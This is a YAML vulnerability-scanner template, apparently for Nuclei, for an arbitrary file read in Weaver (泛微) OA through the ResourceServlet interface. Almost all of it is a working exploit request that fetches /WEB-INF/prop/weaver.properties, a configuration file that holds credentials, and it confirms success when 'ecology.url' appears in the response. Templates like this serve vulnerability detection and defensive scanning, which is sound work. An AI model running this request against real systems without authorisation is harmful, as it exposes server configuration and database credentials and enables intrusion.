id: fanweiOA-ResourceServlet-file-read

info:
  name: 泛微-OA系统ResourceServlet接口任意文件读取漏洞
  author: cnaq 
  severity: high
  description: 泛微-OA系统ResourceServlet接口任意文件读取漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AE-OA%E7%B3%BB%E7%BB%9FResourceServlet%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: fanwei,oa,ebridge,lfi


requests:
  - raw:
      - |
        GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        condition: or
        words:
          - 'ecology.url'
